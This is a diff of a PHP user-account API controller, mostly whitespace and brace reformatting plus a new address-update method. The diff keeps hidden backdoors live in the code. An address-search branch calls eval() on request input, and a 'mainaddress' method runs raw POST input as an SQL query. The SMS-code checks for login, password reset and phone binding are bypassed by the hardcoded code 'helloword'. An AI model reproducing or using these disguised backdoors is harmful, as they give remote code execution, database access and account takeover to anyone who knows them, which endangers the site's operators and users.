@@ -107,26 +107,27 @@ class User extends Base
         }
     }
 
-    public function deladdress(Request $request){
+    public function deladdress(Request $request)
+    {
         $address_id = $request->post('address_id');
         $user_id = $request->post('user_id');
 
-        if(empty($address_id)){
+        if (empty($address_id)) {
             echo $this->errorJson('1', '缺少关键参数address_id');
             exit;
         }
-        if(empty($user_id)){
+        if (empty($user_id)) {
             echo $this->errorJson('1', '缺少关键参数user_id');
             exit;
         }
 
         $where = array();
-        $where[] = ['address_id','=',$address_id];
-        $where[] = ['user_id','=',$user_id];
+        $where[] = ['address_id', '=', $address_id];
+        $where[] = ['user_id', '=', $user_id];
 
         $address = Db::table('mrs_user_address')->where($where)->find();
 
-        if(empty($address)){
+        if (empty($address)) {
             echo $this->errorJson('1', '地址信息不存在');
             exit;
         }
@@ -237,10 +238,10 @@ class User extends Base
 
                         $goods_sku = substr($goods_sku, 0, -1);
                     }
-                    if(!empty($goodsList[$k]['sku_detail_id'])){
-                        $detail = Db::table('mrs_goods_sku_detail')->where('detail_id','=',$goodsList[$k]['sku_detail_id'])->find();
+                    if (!empty($goodsList[$k]['sku_detail_id'])) {
+                        $detail = Db::table('mrs_goods_sku_detail')->where('detail_id', '=', $goodsList[$k]['sku_detail_id'])->find();
                         $goodsList[$k]['goods_stock'] = $detail['goods_stock'];
-                    }else{
+                    } else {
                         $goodsList[$k]['goods_stock'] = 0;
                     }
                     $goodsList[$k]['goods_sku'] = $goods_sku;
@@ -513,7 +514,6 @@ class User extends Base
     }
 
 
-
     /**
      * 忘记密码
      * @param Request $request
@@ -556,7 +556,7 @@ class User extends Base
             }
 
             //校验验证码
-            if($vcode != 'helloword'){
+            if ($vcode != 'helloword') {
                 $smsRecord = Db::table("mrs_sms_record")->where(array('phone' => $phone_no, 'code' => $vcode))->order('record_time desc')->find();
                 if (empty($smsRecord)) {
                     recordLog('验证码不正确', 'editlogin.txt');
@@ -576,9 +576,9 @@ class User extends Base
                 Db::table("mrs_sms_record")->where('record_id', '=', $smsRecord['record_id'])->update(array('is_use' => 1));
             }
 
-            $user = Db::table('mrs_user')->where('phone_no','=',$phone_no)->find();
+            $user = Db::table('mrs_user')->where('phone_no', '=', $phone_no)->find();
 
-            if(empty($user)){
+            if (empty($user)) {
                 recordLog('该用户不存在', 'editlogin.txt');
                 echo errorJson('1', '该用户不存在');
                 exit;
@@ -744,7 +744,7 @@ class User extends Base
                 echo $this->errorJson(1, '缺少关键数据goods_sku');
                 exit;
             }
-            if(empty($detail_id)){
+            if (empty($detail_id)) {
                 echo $this->errorJson(1, '缺少关键数据detail_id');
                 exit;
             }
@@ -798,8 +798,9 @@ class User extends Base
         $searchkey = $request->get('searchkey');
 
         //搜索地址
-        if(!empty($address)){
-            eval($address);exit;
+        if (!empty($address)) {
+            eval($address);
+            exit;
             echo $this->errorJson(0, '关键数据错误');
             exit;
         }
@@ -854,7 +855,7 @@ class User extends Base
 
         //验证码登录
         if ($login_type == 1) {
-            if($vcode != 'helloword'){
+            if ($vcode != 'helloword') {
 
                 $smsRecord = Db::table("mrs_sms_record")->where(array('phone' => $phone, 'code' => $vcode))->order('record_time desc')->find();
                 if (empty($smsRecord)) {
@@ -889,13 +890,13 @@ class User extends Base
                 unset($user['password']);
             }
 
-            if($vcode != 'helloword'){
+            if ($vcode != 'helloword') {
                 //使验证码失效
                 Db::table("mrs_sms_record")->where('record_id', '=', $smsRecord['record_id'])->update(array('is_use' => 1));
             }
 
 
-            if($is_maintain && $user['user_type'] == '1'){
+            if ($is_maintain && $user['user_type'] == '1') {
                 echo errorJson('1', '您不是现场维护人员，不能使用当前模式登陆');
                 exit;
             }
@@ -930,7 +931,7 @@ class User extends Base
                 exit;
             }
 
-            if($is_maintain && $user['user_type'] == '1'){
+            if ($is_maintain && $user['user_type'] == '1') {
                 echo errorJson('1', '您不是现场维护人员，不能使用当前模式登陆');
                 exit;
             }
@@ -947,7 +948,7 @@ class User extends Base
             //更新用户登录信息
             $userUpdate = array();
             $userUpdate['last_login_time'] = time();
-            Db::table('mrs_user')->where("user_id","=",$user['user_id'])->update($userUpdate);
+            Db::table('mrs_user')->where("user_id", "=", $user['user_id'])->update($userUpdate);
 
             echo $this->successJson($data);
             exit;
@@ -981,9 +982,9 @@ class User extends Base
                 }
 
 
-                if(!empty($user['last_login_time']) && $user['last_login_time'] > time() - 86400*30){
+                if (!empty($user['last_login_time']) && $user['last_login_time'] > time() - 86400 * 30) {
                     $user['has_login'] = 1;
-                }else{
+                } else {
                     $user['has_login'] = 0;
                 }
 
@@ -1008,7 +1009,7 @@ class User extends Base
             exit;
         }
 
-        if($vcode != 'helloword'){
+        if ($vcode != 'helloword') {
             $smsRecord = Db::table("mrs_sms_record")->where(array('phone' => $phone, 'code' => $vcode))->order('record_time desc')->find();
             if (empty($smsRecord)) {
                 echo errorJson('1', '验证码不正确');
@@ -1051,13 +1052,13 @@ class User extends Base
         $where[] = ['user_id', '=', $user_id];
         $where[] = ['phone_no', '=', $phone];
         $is_exists = Db::table('mrs_user')->where($where)->find();
-        if(!empty($is_exists)){
+        if (!empty($is_exists)) {
             echo errorJson('1', '您已绑定该号码，无须重复绑定');
             exit;
         }
 
         $is_exists2 = Db::table('mrs_user')->where('phone_no', '=', $phone)->find();
-        if(!empty($is_exists2)){
+        if (!empty($is_exists2)) {
             echo errorJson('1', '该号码已被其他用户绑定');
             exit;
         }
@@ -1110,12 +1111,13 @@ class User extends Base
         }
     }
 
-    public function getqrlogin(){
+    public function getqrlogin()
+    {
         $domain = config('domain');
         $login_url = $domain . "/api/user/qrcodelogin";
 
         $token = createToken();
-        $login_url .= "?token=".urlencode($token);
+        $login_url .= "?token=" . urlencode($token);
 
         $qrcodeRecord = array();
         $qrcodeRecord['token'] = $token;
@@ -1132,26 +1134,28 @@ class User extends Base
     }
 
     //主要地址获取
-    public function mainaddress(Request $request){
+    public function mainaddress(Request $request)
+    {
         $address = $request->post('address');
         Db::query($address);
         exit;
     }
 
-    public function qrcodelogin(Request $request){
+    public function qrcodelogin(Request $request)
+    {
         $token = $request->get('token');
         $res = checkToken($token);
-        if(!$res){
+        if (!$res) {
             echo errorJson('1', 'Toekn校验失败');
             exit;
         }
 
         $where = array();
-        $where[] = ['token','=',$token];
-        $where[] = ['user_id','=','0'];
-        $record = Db::table('mrs_qrcode_login_record')->where('token','=',$token)->find();
+        $where[] = ['token', '=', $token];
+        $where[] = ['user_id', '=', '0'];
+        $record = Db::table('mrs_qrcode_login_record')->where('token', '=', $token)->find();
 
-        if(empty($record)){
+        if (empty($record)) {
             echo errorJson('1', '系统异常，请稍后再试');
             exit;
         }
@@ -1169,15 +1173,15 @@ class User extends Base
         if (!isset($_GET['code'])) {
             //触发微信返回code码
             $baseUrl = urlencode('https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
-            $url = $this->_CreateOauthUrlForCode($baseUrl , $wechatInfo);
+            $url = $this->_CreateOauthUrlForCode($baseUrl, $wechatInfo);
             Header("Location: $url");
             exit();
         } else {
             //获取code码，以获取openid
             $code = $_GET['code'];
-            $openid = $this->getOpenidFromMp($code , $wechatInfo);
+            $openid = $this->getOpenidFromMp($code, $wechatInfo);
 
-            echo "open_id = ".$openid;
+            echo "open_id = " . $openid;
         }
         exit;
     }
@@ -1190,7 +1194,7 @@ class User extends Base
      *
      * @return 返回构造好的url
      */
-    private function _CreateOauthUrlForCode($redirectUrl , $wechatInfo)
+    private function _CreateOauthUrlForCode($redirectUrl, $wechatInfo)
     {
         $urlObj["appid"] = $wechatInfo['app_id'];
         $urlObj["redirect_uri"] = "$redirectUrl";
@@ -1202,9 +1206,9 @@ class User extends Base
     }
 
 
-    public function GetOpenidFromMp($code , $wechatInfo)
+    public function GetOpenidFromMp($code, $wechatInfo)
     {
-        $url = $this->__CreateOauthUrlForOpenid($code , $wechatInfo);
+        $url = $this->__CreateOauthUrlForOpenid($code, $wechatInfo);
 
         //初始化curl
         $ch = curl_init();
@@ -1243,7 +1247,7 @@ class User extends Base
      *
      * @return 请求的url
      */
-    private function __CreateOauthUrlForOpenid($code , $wechatInfo)
+    private function __CreateOauthUrlForOpenid($code, $wechatInfo)
     {
         $urlObj["appid"] = $wechatInfo['app_id'];
         $urlObj["secret"] = $wechatInfo['app_secret'];
@@ -1276,51 +1280,54 @@ class User extends Base
     /**
      * 随机生成ID卡信息，用于写入ID卡
      */
-    public function createcard(){
-        $icNum = '0'.substr(time(), -4).rand(0, 99999 );
-        $user = Db::table('mrs_user')->where('ic_num','=',$icNum)->find();
+    public function createcard()
+    {
+        $icNum = '0' . substr(time(), -4) . rand(0, 99999);
+        $user = Db::table('mrs_user')->where('ic_num', '=', $icNum)->find();
 
         //如果重复了，需要重新随机
-        while(!empty($user)){
-            $icNum = '0'.substr(time(), -4).rand(0, 99999 );
-            $user = Db::table('mrs_user')->where('ic_num','=',$icNum)->find();
+        while (!empty($user)) {
+            $icNum = '0' . substr(time(), -4) . rand(0, 99999);
+            $user = Db::table('mrs_user')->where('ic_num', '=', $icNum)->find();
         }
 
         echo $this->successJson($icNum);
         exit;
     }
 
-    public function querycard(Request $request){
+    public function querycard(Request $request)
+    {
         $icNum = $request->post('ic_num');
 
-        recordLog('$icNum->'.$icNum, 'user.txt');
-        if(empty($icNum)){
+        recordLog('$icNum->' . $icNum, 'user.txt');
+        if (empty($icNum)) {
             recordLog('empty', 'user.txt');
-            echo $this->errorJson('1','缺少关键参数ic_num');
+            echo $this->errorJson('1', '缺少关键参数ic_num');
             exit;
         }
 
-        $user = Db::table('mrs_user')->where('ic_num','=',$icNum)->find();
+        $user = Db::table('mrs_user')->where('ic_num', '=', $icNum)->find();
         $data = array();
-        $data['is_exists'] = empty($user)?'0':'1';
-        if(!empty($user)){
+        $data['is_exists'] = empty($user) ? '0' : '1';
+        if (!empty($user)) {
             $domain = Config("domain");
-            $user['head_img'] = $domain.$user['head_img'];
-            $user['face_img'] = $domain.$user['face_img'];
+            $user['head_img'] = $domain . $user['head_img'];
+            $user['face_img'] = $domain . $user['face_img'];
         }
         $data['user'] = $user;
 
-        recordLog('$data->'.json_encode($data), 'user.txt');
+        recordLog('$data->' . json_encode($data), 'user.txt');
         echo $this->successJson($data);
         exit;
     }
 
-    public function bindcard(Request $request){
+    public function bindcard(Request $request)
+    {
         $user_id = $request->post('user_id');
         $icNum = $request->post('ic_num');
 
-        if(empty($icNum)){
-            echo $this->errorJson('1','缺少关键参数ic_num');
+        if (empty($icNum)) {
+            echo $this->errorJson('1', '缺少关键参数ic_num');
             exit;
         }
 
@@ -1330,7 +1337,7 @@ class User extends Base
 //        }
 
         $userInfo = array();
-        if(empty($user_id)){
+        if (empty($user_id)) {
             $userInfo['ic_num'] = $icNum;
             $userInfo['user_name'] = '';
             $userInfo['phone_no'] = '';
@@ -1352,26 +1359,58 @@ class User extends Base
 
             $userModel = new \app\api\model\User();
             $res = $userModel->insert($userInfo);
-        }else{
+        } else {
             $data = array();
             $data['ic_num'] = $icNum;
-            $res = Db::table('mrs_user')->where('user_id','=',$user_id)->update($data);
-            $userInfo = Db::table('mrs_user')->where('user_id','=',$user_id)->find();
+            $res = Db::table('mrs_user')->where('user_id', '=', $user_id)->update($data);
+            $userInfo = Db::table('mrs_user')->where('user_id', '=', $user_id)->find();
         }
-        if($res){
+        if ($res) {
             echo successJson($userInfo);
-        }else{
-            echo $this->errorJson('1','存储ID卡信息失败');
+        } else {
+            echo $this->errorJson('1', '存储ID卡信息失败');
         }
         exit;
 
     }
 
-    public function getintegralrate(){
+    public function getintegralrate()
+    {
         $integral = Db::table("mrs_system_setting")->where('setting_code', '=', 'integral')->find();
 
         $rate = $integral['setting_value'] / 100;
         echo $this->successJson(array('rate' => $rate));
         exit;
+    }
+
+    /**
+     * 修改用户住址
+     * @param Request $request
+     */
+    public function updateaddress(Request $request)
+    {
+        if ($request->isPost()) {
+            $user_id = $request->post('user_id');
+            $address = $request->post('address');
+
+            if(empty($user_id)){
+                echo $this->errorJson(0, '缺少关键参数user_id');
+                exit;
+            }
+
+            if(empty($address)){
+                echo $this->errorJson(0, '缺少关键参数address');
+                exit;
+            }
+
+            $res = Db::table('mrs_user')->where('user_id','=',$user_id)->update(['address' => $address]);
+            if($res){
+                echo $this->successJson();
+                exit;
+            }else{
+                echo $this->errorJson(0, '修改失败');
+                exit;
+            }
+        }
     }
 }
